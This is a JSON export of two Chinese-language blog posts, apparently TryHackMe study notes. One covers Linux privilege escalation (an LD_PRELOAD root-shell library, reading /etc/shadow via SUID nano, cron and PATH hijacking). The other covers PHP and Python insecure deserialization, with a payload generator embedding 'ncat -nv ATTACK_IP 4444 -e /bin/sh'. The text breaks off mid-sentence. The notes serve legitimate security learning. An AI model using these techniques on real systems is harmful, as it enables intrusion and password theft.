[{"content":"Sudo 默认情况下，sudo 命令允许您以 root 权限运行程序。在某些情况下，系统管理员可能需要赋予普通用户一定的权限灵活性。例如，初级 SOC 分析师可能需要定期使用 Nmap ，但无法获得完全的 root 访问权限。在这种情况下，系统管理员可以允许该用户仅以 root 权限运行 Nmap ，同时在系统的其余部分保持其常规权限级别。\n任何用户都可以使用 sudo -l 命令检查其当前与 root 权限相关的情况。\nhttps://gtfobins.github.io/ 是一个有价值的资源，它提供了有关如何使用您可能拥有 sudo 权限的任何程序的信息。\n利用应用程序功能 某些应用程序在此上下文中不会存在已知的漏洞。您可能看到的此类应用程序是 Apache2 服务器。\n在这种情况下，我们可以利用应用程序的某个功能，通过“黑客”手段泄露信息。如下所示，Apache2 有一个选项支持加载备用配置文件（ -f ：指定备用的 ServerConfigFile）。\n使用此选项加载 /etc/shadow 文件将导致包含 /etc/shadow 文件第一行的错误消息。\n利用 LD_PRELOAD 在某些系统上，您可能会看到 LD_PRELOAD 环境选项。\nLD_PRELOAD 是一个允许任何程序使用共享库的函数。这篇博文将带您了解 LD_PRELOAD 的功能。如果启用了“env_keep”选项，我们可以生成一个共享库，该库将在程序运行之前加载并执行。请注意，如果实际用户 ID 与有效用户 ID 不同，LD_PRELOAD 选项将被忽略。\n该权限提升向量的步骤可概括如下；\n检查 LD_PRELOAD（使用 env_keep 选项） 编写一个简单的 C 代码，编译为共享对象（.so 扩展名）文件 使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行该程序 C 代码将简单地生成一个 root shell，可以按如下方式编写；\n1 2 3 4 5 6 7 8 9 10 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; void _init() { unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); // 避免后续环境变量冲突 setgid(0); // 设置组ID为root setuid(0); // 设置用户ID为root system(\u0026#34;/bin/bash\u0026#34;); // 启动root shell } 我们可以将此代码保存为 shell.c，并使用 gcc 将其编译为共享目标文件，使用以下参数；\n1 gcc -fPIC -shared -o shell.so shell.c -nostartfiles 现在，我们可以在启动任何用户可以使用 sudo 运行的程序时使用这个共享对象文件。在我们的例子中，Apache2、find，或者几乎所有可以使用 sudo 运行的程序都可以使用。\n我们需要通过指定 LD_PRELOAD 选项来运行程序，如下所示；\n1 sudo LD_PRELOAD=/home/user/ldpreload/shell.so find 这将导致产生具有 root 权限的 shell。\nSUID Linux 的大部分权限控制依赖于控制用户与文件的交互。这通过权限来实现。现在，您知道文件可以具有读、写和执行权限。这些权限会根据用户的权限级别授予用户。SUID（设置用户标识）和 SGID（设置组标识）会改变权限级别。SUID 和 SGID 分别允许文件以文件所有者或组所有者的权限级别执行。\n您会注意到这些文件有一个“s”位设置，显示其特殊权限级别。\nfind / -type f -perm -04000 -ls 2\u0026gt;/dev/null 将列出设置了 SUID 或 SGID 位的文件。\n一个好的做法是将此列表中的可执行文件与 GTFOBins ( https://gtfobins.github.io ) 进行比较。点击 SUID 按钮将过滤掉已知在设置了 SUID 位的情况下可被利用的二进制文件（您也可以使用此链接获取预过滤列表 https://gtfobins.github.io/#+suid ）。\n上面的列表显示 nano 已设置 SUID 位。不幸的是，GTFObins 并没有给我们提供轻松的攻击机会。在现实生活中的提权场景中，我们需要找到一些中间步骤，以便利用我们掌握的任何微小的发现。\n为 nano 文本编辑器设置的 SUID 位允许我们使用文件所有者的权限创建、编辑和读取文件。nano 的所有者是 root，这意味着我们可以以比当前用户更高的权限级别读取和编辑文件。目前，我们有两个基本的提权选项：读取 /etc/shadow 文件或将用户添加到 /etc/passwd 。\n以下是使用这两个向量的简单步骤。\n读取 /etc/shadow 文件\n我们看到 nano 文本编辑器通过运行 find / -type f -perm -04000 -ls 2\u0026gt;/dev/null 命令设置了 SUID 位。\nnano /etc/shadow 将打印 /etc/shadow 文件的内容。现在我们可以使用 unshadow 工具创建一个可被 John the Ripper 破解的文件。为此，unshadow 需要 /etc/shadow 和 /etc/passwd 文件。\nunshadow工具的用法如下所示；\n1 unshadow passwd.txt shadow.txt \u0026gt; passwords.txt 只要有正确的单词表和一点运气， John the Ripper 就能以明文形式返回一个或多个密码。\n另一个选项是添加一个具有 root 权限的新用户。这将帮助我们规避繁琐的密码破解过程。以下是一个简单的方法：\n我们需要获取新用户密码的哈希值。使用 Kali Linux 上的 openssl 工具可以快速完成此操作。\n然后我们将此密码与用户名一起添加到 /etc/passwd 文件中。\n一旦添加了我们的用户（请注意如何使用 root:/bin/bash 来提供 root shell），我们将需要切换到该用户，并且希望拥有 root 权限。\nCapabilities 系统管理员可以使用另一种方法来提升进程或二进制文件的权限级别，即“功能”。功能有助于在更精细的层面上管理权限。例如，如果 SOC 分析师需要使用一个需要启动套接字连接的工具，那么普通用户将无法执行此操作。如果系统管理员不想授予此用户更高的权限，他们可以更改二进制文件的功能。这样，二进制文件就可以完成其任务，而无需更高权限的用户。\n功能手册页提供了有关其用法和选项的详细信息。\n我们可以使用 getcap 工具列出已启用的功能。\n当以非特权用户身份运行时， getcap -r / 将生成大量错误，因此将错误消息重定向到 /dev/null 是一种很好的做法。\n请注意，vim 及其副本均未设置 SUID 位。因此，在枚举文件查找 SUID 时，无法发现此权限提升向量。\nGTFObins 有一个很好的二进制文件列表，如果我们发现任何设置功能，就可以利用这些二进制文件来提升权限。\n我们注意到 vim 可以与以下命令和有效载荷一起使用：\n这将启动一个 root shell，如下所示；\nCron Job Cron Job用于在特定时间运行脚本或二进制文件。默认情况下，它们以其所有者的权限运行，而不是当前用户的权限。虽然正确配置的 Cron 作业本身并不会受到攻击，但在某些情况下，它们可能会提供提权途径。\n这个想法很简单；如果有一个以 root 权限运行的计划任务，并且我们可以更改将要运行的脚本，那么我们的脚本将以 root 权限运行。\nCron job配置存储为 crontab（cron 表），以查看任务下次运行的时间和日期。\n系统中的每个用户都有自己的 crontab 文件，无论是否登录都可以运行特定的任务。正如你所料，我们的目标是找到一个由 root 设置的 cron job，并让它运行我们的脚本（最好是一个 shell）。\n任何用户都可以读取 /etc/crontab 下保存系统范围 cron job的文件\n虽然 CTF 机器可以每分钟或每 5 分钟运行一次 cron job，但在渗透测试中，您更经常会看到每天、每周或每月运行的任务。\n您可以看到， backup.sh 脚本已配置为每分钟运行一次。该文件的内容是一个简单的脚本，用于创建 prices.xls 文件的备份。\n由于我们当前的用户可以访问此脚本，我们可以轻松地修改它以创建反向 shell，希望具有 root 权限。\n该脚本将使用目标系统上可用的工具来启动反向 shell。\n需要注意两点；\n命令语法将根据可用的工具而有所不同。（例如， nc 可能不支持您可能在其他情况下看到的 -e 选项） 我们应该始终优先启动反向 shell，因为我们不想在实际渗透测试过程中损害系统完整性。 该文件应如下所示；\n我们现在将在攻击机器上运行一个监听器来接收传入的连接。\nCrontab 始终值得检查，因为它有时可能导致简单的权限提升向量。以下情况在网络安全成熟度不高的公司中并不少见：\n系统管理员需要定期运行脚本。 他们创建了一个 cron job来执行此操作 过了一段时间，脚本变得毫无用处，他们就删除了它 他们没有清理相关的 cron job 此变更管理问题导致可能利用 cron job进行攻击。\n上面的例子显示了类似的情况，其中 antivirus.sh 脚本被删除，但 cron job仍然存在。\n如果未定义脚本的完整路径（例如在 backup.sh 脚本中已定义），cron 将引用/etc/crontab 文件中 PATH 变量下列出的路径。在这种情况下，我们应该能够在用户主文件夹下创建一个名为“antivirus.sh”的脚本，并由 cron job运行它。\n目标系统上的文件应该看起来很熟悉：\n传入的反向 shell 连接具有 root 权限：\n如果你偶然发现一个现有的脚本或任务被附加到 cron job中，那么花时间去了解该脚本的功能以及在上下文中如何使用任何工具总是值得的。例如，tar、7z、rsync 等工具可以利用它们的通配符功能来利用它们。\nPATH 如果路径中存在用户拥有写入权限的文件夹，则可能会劫持应用程序来运行脚本 。Linux 中的 PATH 是一个环境变量，它指示操作系统在哪里搜索可执行文件。对于任何未内置于 Shell 或未使用绝对路径定义的命令， Linux 都会开始在 PATH 下定义的文件夹中搜索。（PATH 是我们这里讨论的环境变量，path 是文件的位置）。\n通常，PATH 看起来像这样：\n为了演示目的我们将使用以下脚本：\n该脚本尝试启动名为“ thm ”的系统二进制文件，但该示例可以轻松地用任何二进制文件复制。\n我们将其编译为可执行文件并设置 SUID 位。\n我们的用户现在可以访问设置了 SUID 位的“路径”脚本。\n一旦执行，“path”将在 PATH 下列出的文件夹中查找名为“ thm ”的可执行文件。\n如果 PATH 下列出了任何可写文件夹，我们可以在该目录下创建一个名为 thm 的二进制文件，并让“path”脚本运行它。由于设置了 SUID 位，该二进制文件将以 root 权限运行。\n可以使用“ find / -writable 2\u0026gt;/dev/null ”命令简单搜索可写文件夹。此命令的输出可以通过简单的剪切和排序序列进行清理。\n一些 CTF 场景可以呈现不同的文件夹，但常规系统会输出类似我们上面看到的内容。\n将其与 PATH 进行比较将帮助我们找到可以使用的文件夹。\n我们在 /usr 下看到许多文件夹，因此可以更轻松地再次运行可写文件夹搜索以覆盖子文件夹。\n另一种方法是使用下面的命令。\n1 find / -writable 2\u0026gt;/dev/null | cut -d \u0026#34;/\u0026#34; -f 2,3 | grep -v proc | sort -u 我们添加了“grep -v proc”来摆脱与正在运行的进程相关的许多结果。\n不幸的是，/usr 下的子文件夹不可写\n更容易写入的文件夹可能是 /tmp。此时，由于 PATH 中没有 /tmp，所以我们需要添加它。如下所示，“ export PATH=/tmp:$PATH ”命令可以完成此操作。\n此时，路径脚本还将在 /tmp 文件夹下查找名为“ thm ”的可执行文件。\n通过将 /bin/bash 复制为 /tmp 文件夹下的“ thm ”，创建此命令相当容易。\n我们已经赋予了 /bin/bash 副本可执行权限，请注意，此时它将以我们的用户权限运行。在此上下文中，权限提升之所以成为可能，是因为路径脚本以 root 权限运行。\n","date":"2025-04-24T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/girl-7628308.jpg","permalink":"https://Yerucrem.github.io/p/linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/","title":"Linux权限提升"},{"content":"重要概念 序列化 把序列化想象成早上收拾书包。你需要把书、笔记本、午餐盒和水瓶整理好放进书包里。序列化就像把不同的信息（比如笔记）放在一起，方便存储或发送给朋友。\n在编程中，序列化是将对象的状态转换为人类可读或二进制格式（或两者的混合）的过程，以便根据需要进行存储、传输和重构。对于需要在系统不同部分之间或跨网络传输数据的应用程序（例如基于 Web 的应用程序），此功能至关重要。在 PHP 中，此过程使用 serialize() 函数执行。\n例子\n1 2 3 4 5 \u0026lt;?php $noteArray = array(\u0026#34;title\u0026#34; =\u0026gt; \u0026#34;My THM Note\u0026#34;, \u0026#34;content\u0026#34; =\u0026gt; \u0026#34;Welcome to THM!\u0026#34;); $serialisedNote = serialize($noteArray); // Converting the note into a storable format file_put_contents(\u0026#39;note.txt\u0026#39;, $serialisedNote); // Saving the serialised note to a file ?\u0026gt; 以下输出显示了 note.txt 文件中的序列化字符串，其中包含笔记结构和内容的详细信息。它以一种易于保存或传输的方式存储。\n序列化注释 ： a:2:{s:5:\u0026quot;title\u0026quot;;s:12:\u0026quot;My THM Note\u0026quot;;s:7:\u0026quot;content\u0026quot;;s:12:\u0026quot;Welcome to THM!\u0026quot;;}\n反序列化 想象一下，你到了学校，需要用到今天早上打包好的所有东西。反序列化就像你上课时打开书包，把每件物品都拿出来，这样一整天都能用到。当你打开书包去拿书本和午餐时，反序列化会把打包好的数据重新转换成你可以使用的东西。反序列化是将格式化的数据转换回对象的过程。这对于从文件、数据库或网络检索数据，并将其恢复到原始状态以供应用程序使用至关重要。\n按照我们前面的例子，下面是如何在 PHP 中反序列化注释数据：\n1 2 3 4 5 6 \u0026lt;?php $serialisedNote = file_get_contents(\u0026#39;note.txt\u0026#39;); // Reading the serialised note from the file $noteArray = unserialize($serialisedNote); // Converting the serialised string back into a PHP array echo \u0026#34;Title: \u0026#34; . $noteArray[\u0026#39;title\u0026#39;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;Content: \u0026#34; . $noteArray[\u0026#39;content\u0026#39;]; ?\u0026gt; 这段代码从文件中读取序列化的笔记，并将其转换回数组，从而有效地重建原始笔记。讨论序列化也需要讨论安全性。就像你不希望有人篡改你的书包一样，不安全的反序列化可能会导致软件应用程序中出现严重的安全漏洞。攻击者可能会篡改序列化对象以执行未经授权的操作或窃取数据。\n序列化格式 虽然不同的编程语言可能使用不同的关键字和函数进行序列化，但其基本原理是一致的。众所周知，序列化是将对象的状态转换为易于存储或传输，并在以后重建的格式的过程。无论是 Java、Python、.NET 还是 PHP ，每种语言都实现了序列化，以适应其环境固有的特定功能或安全措施。\n与利用用户输入的即时处理的其他常见漏洞不同，不安全的反序列化问题涉及与应用程序核心逻辑的更深层次的交互，通常会操纵其组件的基本行为。\n现在，让我们探索如何在不同的语言中明确处理序列化，探索其功能、语法和独特的特性。\nPHP 序列化 在 PHP 中，序列化是使用 serialize() 函数完成的。此函数将 PHP 对象或数组转换为表示对象数据和结构的字节流。生成的字节流可以包含各种数据类型，例如字符串、数组和对象，从而使其具有唯一性。为了说明这一点，我们以一个笔记应用程序为例，用户可以在其中保存和检索他们的笔记。我们将创建一个名为 Notes 的 PHP 类来表示每条笔记，并处理序列化和反序列化。\n1 2 3 4 5 6 7 class Notes { public $Notescontent; public function __construct($content) { $this-\u0026gt;Notescontent = $content; } } 在我们的 Notes 应用中，当用户保存笔记时，我们会使用 PHP 的 serialize() 函数序列化 Notes 类对象。这会将对象转换为可存储在文件或数据库中的字符串表示形式。我们来看看以下序列化 Notes 类对象的代码片段：\n1 2 $note = new Notes(\u0026#34;TEST123\u0026#34;); $serialized_note = serialize($note); 序列化后它将生成如下所示的输出\n1 O:5:\u0026#34;Notes\u0026#34;:1:{s:7:\u0026#34;content\u0026#34;;s:7:\u0026#34;TEST123\u0026#34;;} 让我们解码输出：\nO:5:\u0026quot;Notes\u0026quot;:1: ：此部分表示序列化数据代表 Notes 类的对象，该对象具有一个属性。 s:7:\u0026quot;content\u0026quot; ：这表示属性名称“ content ”，长度为 7 个字符。在序列化数据中，字符串用 s 表示，后跟字符串长度，字符串用双引号括起来。整数用 i 表示 ，后跟不带引号的数值。 s:14:\u0026quot;TEST123\u0026quot; ：这是内容属性的值，长度为 7 个字符。 魔法方法 PHP PHP 提供了一些在序列化过程中起着至关重要作用的魔术方法 。下面列出了一些重要的方法：\n__sleep() ：此方法在对象序列化之前调用。它可以清理资源，例如数据库连接，并返回一个需要序列化的属性名称数组。 __wakeup() ：此方法在反序列化时调用。它可以重新建立对象正常运行所需的任何连接。 __serialize() ：从 PHP 7.4 开始，此方法允许您通过返回表示对象序列化形式的数组来自定义序列化数据。 __unserialize() ： __serialize() 的对应函数允许自定义从序列化数据中恢复对象。 PYTHON Python 使用名为 Pickle 的模块来序列化和反序列化对象。该模块将 Python 对象转换为字节流（反之亦然），使其能够保存到文件或通过网络传输。Pickling 对 Python 开发人员来说是一个强大的工具，因为它可以处理几乎所有类型的 Python 对象，而无需手动处理对象的状态。我们将在 Python 和 PHP 中遵循相同的笔记应用程序。以下是 app.py 类的代码片段：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import pickle import base64 ... serialized_data = request.form[\u0026#39;serialized_data\u0026#39;] notes_obj = pickle.loads(base64.b64decode(serialized_data)) message = \u0026#34;Notes successfully unpickled.\u0026#34; ... elif request.method == \u0026#39;POST\u0026#39;: if \u0026#39;pickle\u0026#39; in request.form: content = request.form[\u0026#39;note_content\u0026#39;] notes_obj.add_note(content) pickled_content = pickle.dumps(notes_obj) serialized_data = base64.b64encode(pickled_content).decode(\u0026#39;utf-8\u0026#39;) binary_data = \u0026#39; \u0026#39;.join(f\u0026#39;{x:02x}\u0026#39; for x in pickled_content) message = \u0026#34;Notes pickled successfully.\u0026#34; Pickling Process\n创建 Notes 类 ：该类用于管理笔记列表。它提供了添加笔记和检索所有笔记的方法，方便管理应用程序的状态。 序列化（Pickling） ：当用户提交注释时，Notes 类实例（包括所有注释）将使用 pickle.dumps() 进行序列化。此函数将 Python 对象转换为二进制格式，以便 Python 稍后可以将其转换回对象。 显示序列化数据（Base64 编码）\n为什么使用 base64 编码 ：序列化数据是二进制的，并非在所有环境下都适合安全显示。二进制数据可能包含一些字节，这些字节可能会干扰通信协议（例如 HTTP ）。Base64 是一种将二进制数据转换为纯文本的编码方案。它只使用可读字符，因此即使在不支持二进制数据的通道上传输，也能保证安全。 编码过程 ：序列化 Notes 对象后，使用 base64.b64encode() 将二进制数据编码为 base64 字符串。此字符串可以安全地显示在 HTML 中，并且易于存储或传输。 反序列化（Unpickling）\nBase64 解码 ：解封时，首先使用 base64.b64decode() 将 base64 字符串解码回二进制格式。 反序列化 ：然后将二进制数据传递给 pickle.loads() ，后者从二进制流中重建原始 Python 对象。 使用字符串\u0026quot;TEST123\u0026ldquo;进行序列化后可以得到：\nPickling ：当此字符串被 pickle 时，它​​会被转换成人类无法读取的二进制格式。此二进制格式包含有关数据类型、数据本身以及重建对象所需的其他元数据的信息。 Base64 编码 ：数据的二进制形式随后被编码为 Base64 字符串，可能看起来像 gASVIQAAAAAAAACMBFdlbGNvbWXCoGFkZYFdcQAu 。 在探索序列化格式时，我们讨论了如何在 PHP 和 Python 中实现这一关键功能。PHP 使用 serialize() 和 unserialize() 函数将对象和其他数据类型转换为易于存储且易于重建的格式。同样，Python 使用 Pickle 模块将对象序列化为字节流，并将其反序列化回原始状态。\n除了这两种语言之外，序列化是各种编程环境的共同特性，每种环境都有独特的实现和库。在 Java 中，对象序列化通过 Serializable 接口实现，允许将对象转换为字节流，反之亦然，这对于网络通信和数据持久性至关重要。对于 .NET，序列化多年来已经有了显著的发展。最初， BinaryFormatter 通常用于二进制序列化；但是， 由于安全问题， 现在不鼓励使用它 。现代 .NET 应用程序通常使用 System.Text.Json 进行 JSON 序列化，或使用 System.Xml.Serialization 进行 XML 任务，这反映了向更安全、更标准化的数据交换格式的转变。Ruby 通过其 Marshal 模块提供了简便性，该模块以序列化和反序列化对象而闻名，对于更易于人类阅读的格式，它通常使用 YAML 。每种语言的序列化方法都反映了其使用上下文和安全注意事项，强调了理解和正确实现序列化以确保跨 Web 应用程序的数据完整性和安全性的重要性。\n鉴别 在彻底了解不同编程语言的序列化之后，我们将转向网络安全的一个关键方面，即利用和缓解与序列化相关的漏洞。在讨论漏洞利用技术的具体细节之前，务必了解如何识别应用程序中的这些漏洞，无论您是否能够访问代码（白盒测试）或是不能（黑盒测试）。\n访问源代码 当可以访问源代码时，识别序列化漏洞会更加简单，但需要对要查找的内容有敏锐的理解。例如，通过代码审查，我们可以检查源代码中是否存在 serialize() 、 unserialize() 、 pickle.loads( ) 等序列化函数 。我们必须特别注意任何可能将用户提供的输入直接传递给这些函数的位置。\n无法访问源代码 在无法访问源代码的情况下审计应用程序时，挑战在于仅根据外部观察和交互推断其如何处理数据。这通常被称为黑盒测试 。在这里，我们专注于检测服务器响应和 cookie 中的模式，这些模式可能表明使用了序列化和潜在的漏洞。作为一名渗透测试人员，在 PHP 文件名末尾附加波浪号 ~ 是攻击者用来尝试访问由文本编辑器或版本控制系统创建的备份或临时文件的常用技术。当编辑或保存文件时，某些文本编辑器或版本控制系统可能会在文件名后附加波浪号，制作原始文件的备份副本。\n分析服务器响应\n错误消息 ：某些错误消息可以间接表明序列化存在问题。例如，PHP 可能会抛出包含 **unserialize()** 或 Object deserialisation error 等短语的错误或警告，这些短语会暴露底层序列化过程和潜在的漏洞。 应用程序行为不一致 ：响应被操纵的输入（例如，修改的 Cookie 或 POST 数据）时出现的异常行为可能表明数据反序列化和处理方式存在问题。观察应用程序如何处理被修改的序列化数据可以提供潜在漏洞代码的线索。 检查 Cookie\nCookie 中的 Base64 编码值（ PHP 和 .NET） ：如果 Cookie 包含看似 Base64 编码的数据，对其进行解码可能会发现序列化的对象或数据结构。PHP 通常使用序列化进行会话管理，并以序列化格式存储会话变量。 ASP.NET 视图状态 ：.NET 应用程序可能会在发送到客户端浏览器的视图状态中使用序列化。有时可以看到一个名为 __VIEWSTATE 的字段，该字段采用 base64 编码。对其进行解码和检查可以揭示它是否包含可被利用的序列化数据。 漏洞利用-更新属性 更新对象的属性 在本任务中，我们将探索一个 PHP 实例，并以一个简单的笔记共享应用程序作为案例研究。我们的笔记共享应用程序允许用户轻松创建、保存和共享笔记。用户可以将笔记输入到应用程序中，然后将其保存以供将来参考。此外，用户还可以与他人共享笔记，从而促进协作和信息交换。该应用程序还包含基于订阅的功能，确保只有订阅用户才能访问某些功能，例如笔记共享。您可以通过链接 http://10.10.183.12/case1 访问该网站。\n让我们了解一下该应用程序是如何构建的。\n定义 Notes 类 该应用程序有一个 Notes 类，代表我们应用程序中的一条注释。该类有三个私有属性： user 、 role 和 isSubscribed 。我们还有 setter 和 getter 方法来操作 isSubscribed 属性。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Notes { private $user; private $role; private $isSubscribed; public function __construct($user, $role, $isSubscribed) { $this-\u0026gt;user = $user; $this-\u0026gt;role = $role; $this-\u0026gt;isSubscribed = $isSubscribed; } public function setIsSubscribed($isSubscribed) { $this-\u0026gt;isSubscribed = $isSubscribed; } public function getIsSubscribed() { return $this-\u0026gt;isSubscribed; } } 将用户数据存储在 Cookie 中 当用户首次访问我们的应用时，它会设置一个序列化的 Cookie，其中包含用户数据。这些数据包括用户名、角色和订阅状态（ isSubscribed ）。如果用户是付费会员（ isSubscribed = true ），则允许他们分享笔记。\n利用漏洞 在此步骤中，我们将说明攻击者如何通过修改序列化的 cookie 值来利用此漏洞，以获得对共享笔记的未经授权的访问。\n序列化 cookie ：解码 base64 编码的 cookie 值后，我们获得 Notes 对象的以下序列化表示：\n1 O:5:\u0026#34;Notes\u0026#34;:3:{s:4:\u0026#34;user\u0026#34;;s:5:\u0026#34;guest\u0026#34;;s:4:\u0026#34;role\u0026#34;;s:5:\u0026#34;guest\u0026#34;;s:12:\u0026#34;isSubscribed\u0026#34;;b:0; 我们已经知道，在 PHP 序列化过程中，如果属性名不是公开的，则类名会作为属性名的前缀，以确保唯一性并方便反序列化。这是 PHP 内部处理对象序列化和反序列化的方式之一。当一个对象被序列化时， PHP 会存储该对象的属性和类名。这确保了当对象稍后被反序列化时， PHP 知道要实例化哪个类，以及如何将序列化的数据正确地赋值给对象的属性。让我们将序列化注释分解成各个部分：\nO:5:\u0026ldquo;Notes\u0026rdquo;:3 ：这表示具有类名 Notes 的对象（O），它具有三个属性。 s:4:\u0026ldquo;user\u0026rdquo;;s:5:\u0026ldquo;guest\u0026rdquo; ：这表示一个长度为 4 个字符的字符串，代表值为“ guest ”的属性 user 。 s:4:\u0026ldquo;role\u0026rdquo;;s:5:\u0026ldquo;guest\u0026rdquo; ：与上一个类似，它表示值为“ guest ”的属性 role 。 s:12:\u0026ldquo;isSubscribed\u0026rdquo;;b:0 ：这表示名为 isSubscribed 的布尔 (b) 属性，其值为 false (0)。 利用漏洞 在当前情况下，当用户想要尝试分享笔记时，他们会看到以下弹出窗口：\n那么后端发生了什么？后端 PHP 代码会验证传入的 Cookie，对其进行反序列化，然后验证用户是否已订阅。我们的主要任务就是绕过这一步。\n假设攻击者拦截了此序列化的 Cookie 值，并将其 isSubscribed 属性从 false (0) 修改为 true (1)。攻击者可以通过更改序列化数据中的布尔值，在未经合法授权的情况下操纵订阅状态。\n修改后，攻击者会再次对序列化数据进行 base64 编码，并用修改后的值替换原始 cookie 值。这将允许攻击者获得未经授权的访问权限，从而绕过预定的订阅限制，在其他平台上共享笔记。\n漏洞利用-对象注入 对象注入是一种由 Web 应用程序中不安全的数据反序列化引起的漏洞。当不受信任的数据被反序列化为对象时，攻击者可以利用该漏洞操纵序列化数据并执行任意代码，从而造成严重的安全风险。\n众所周知，该漏洞源于序列化和反序列化过程，该过程允许将 PHP 对象转换为可存储格式（序列化），然后重建为对象（反序列化）。虽然序列化和反序列化对于数据存储和传输非常有用，但如果实施不当，也可能带来安全风险。\n要利用 PHP 对象注入漏洞，应用程序必须包含一个包含 PHP 魔术方法（例如 __wakeup 或 __sleep ）的类，以便攻击者利用这些方法进行恶意攻击。所有涉及攻击的类都应在调用 unserialize() 方法之前声明（除非支持对象自动加载）。\n例子\n让我们考虑一个 index.php 代码片段，它展示了如何使用 serialize() 和 unserialize() 函数进行序列化和反序列化。该代码接受 GET 参数的解码或编码 ，并相应地转换用户提供的值。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php class UserData { private $data; public function __construct($data) { $this-\u0026gt;data = $data; } .. require \u0026#39;test.php\u0026#39;; if(isset($_GET[\u0026#39;encode\u0026#39;])) { $userData = new UserData($_GET[\u0026#39;encode\u0026#39;]); $serializedData = serialize($userData); $base64EncodedData = base64_encode($serializedData); echo \u0026#34;Normal Data: \u0026#34; . $_GET[\u0026#39;encode\u0026#39;] . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;Serialized Data: \u0026#34; . $serializedData . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;Base64 Encoded Data: \u0026#34; . $base64EncodedData; } elseif(isset($_GET[\u0026#39;decode\u0026#39;])) { $base64EncodedData = $_GET[\u0026#39;decode\u0026#39;]; $serializedData = base64_decode($base64EncodedData); $test = unserialize($serializedData); echo \u0026#34;Base64 Encoded Serialized Data: \u0026#34; . $base64EncodedData . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;Serialized Data: \u0026#34; . $serializedData; ... 例如，如果我们通过 URL http ://10.10.183.12/case2/?encode= hellothm 发送输入 hellothm ，我们将得到以下输出：\n我们看到代码中包含一个名为 test.php 的文件。通过查看源代码或考虑该框架是否开源，渗透测试人员知道 test.php 包含一个名为 MaliciousUserData 的类，如下所示：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class MaliciousUserData { public $command = \u0026#39;ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh\u0026#39;; // call to troubleshooting server public function __wakeup() { exec($this-\u0026gt;command); ... ?\u0026gt; 在上述代码中，通过不安全的反序列化，攻击者可以操纵对象的属性，包括修改 MaliciousUserData 类的 command 属性。这可以通过精心设计一个包含所需属性值的序列化字符串来实现。 例如，如果我们想要修改 command 属性以执行其他命令或连接到其他服务器，我们可以将一个对象序列化为所需的属性值，然后将其注入到存在漏洞的 unserialize() 函数中。这样，在反序列化时，被操纵的属性值将被加载到对象中。\n需要注意的是，在不安全的反序列化过程中，您无法直接更新 __wakeup 方法本身的定义。__ __wakeup 方法是类定义的一部分，在反序列化过程中保持静态。但是，您可以在 __wakeup 方法中修改对象的行为或属性。这意味着，虽然该方法的定义保持不变，但其在反序列化时的操作可以被操纵以实现不同的结果。\n准备Payload 如前所述，调用另一个类是 PHP 的常规功能，如果目标网站使用开源代码，您可以查看该文件的代码。index.php 的代码会盲目地反序列化输入，而不执行任何清理。这里有什么选择呢？如果我们修改 MaliciousUserData 类并修改其 command 属性，使得在调用 __wakeup 函数时，使用攻击者提供的值进行调用，结果会怎样？\n创建一些 PHP 代码来生成恶意序列化的用户数据。\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php class MaliciousUserData { public $command = \u0026#39;ncat -nv ATTACK_IP 4444 -e /bin/sh\u0026#39;; } $maliciousUserData = new MaliciousUserData(); $serializedData = serialize($maliciousUserData); $base64EncodedData = base64_encode($serializedData); echo \u0026#34;Base64 Encoded Serialized Data: \u0026#34; . $base64EncodedData; ?\u0026gt; 在上面的代码中， MaliciousUserData 类（ test.php ）的 _wakeup() 函数将使用 Ncat 执行反向 shell 命令，连接到指定的 IP 地址（ ATTACK_IP ）和端口（ 4444 ），并使用 -e 标志以 shell 形式执行 /bin/sh 创建文件后，通过终端执行 php index.php 。这将返回一个 base64 编码的 MaliciousUserData 类序列化对象。 生成的 base64 编码字符串如下所示： TzoxNzoiTWFsaWNp[Redacted] 。 使用 AttackBox 上的命令 nc -nvlp 4444 启动端口 4444 上的 Netcat 监听器。 现在，是时候通过访问 URL http://10.10.183.12/case2/?decode=[SHELLCODE] 来解码 shellcode 来利用不安全的反序列化，而无需生成 shellcode。 一旦访问该 URL，index.php 文件的反序列​​化函数就会对字符串进行反序列化并执行 __wakeup() 函数，从而进入远程 shell。 自动化脚本 在渗透测试过程中，自动化脚本对于高效识别和利用 Web 应用程序中的漏洞至关重要。我们将探索一款名为 PHP Gadge Chain (PHPGGC) 的工具，它在此过程中发挥着至关重要的作用，能够自动发现不安全的反序列化漏洞。PHPGGC 类似于 Java 生态系统中的 Ysoserial，可帮助安全专业人员评估 PHP 应用程序的安全状况并降低潜在风险。\nPHP 工具链 (PHPGGC) PHPGGC 主要是一个用于生成 PHP 对象注入攻击中使用的小工具链的工具，专门用于利用与 PHP 对象序列化和反序列化相关的漏洞。\n功能\n小工具链 ：PHPGGC 为各种 PHP 框架和库提供了一个小工具链库。这些小工具链是对象和方法的序列，旨在当 PHP 应用程序不安全地反序列化用户提供的数据时利用特定的漏洞。 有效载荷生成 ：PHPGGC 的主要目的是促进生成可触发这些漏洞的序列化有效载荷。它帮助安全研究人员和渗透测试人员创建有效载荷，以展示不安全的反序列化漏洞的影响。 有效载荷定制 ：用户可以通过为小工具链中涉及的函数或方法指定参数来定制有效载荷，从而定制攻击以实现特定结果，例如编码。 可以从 GitHub 仓库下载 PHPGGC，已安装的版本已包含一些小工具链、PHP 对象序列以及旨在利用反序列化漏洞的方法调用。这些小工具链利用 PHP 的魔术方法来实现各种攻击目标，例如远程代码执行。\n要列出所有可用的小工具链，您可以使用 PHPGGC 的 -l 选项，它将显示发起特定攻击的名称、版本、类型和向量。此外，您还可以根据小工具链的功能进行筛选，例如针对特定 PHP 